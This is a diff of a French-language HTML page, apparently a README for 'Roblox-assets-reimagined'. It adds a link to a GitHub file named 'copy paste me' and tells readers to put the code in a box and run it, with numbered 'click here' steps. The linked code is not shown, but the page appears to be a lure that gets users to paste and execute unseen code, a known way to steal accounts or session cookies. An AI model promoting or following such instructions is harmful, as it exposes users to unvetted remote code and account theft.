@@ -8,7 +8,7 @@
 </a>
 
 <p>Ensuite, mettez le code dans la boîte puis exécutez-le.</p>
-
+https://github.com/erwantestI23/Roblox-assets-reimagined/blob/main/copy%20paste%20me
 <h3>2️⃣ Cliquez ici</h3>
 <a href="https://raw.githubusercontent.com/erwantestI23/Roblox-assets-reimagined/refs/heads/main/3.png">
     <img src="https://raw.githubusercontent.com/erwantestI23/Roblox-assets-reimagined/refs/heads/main/3.png" alt="Étape 2" width="600">
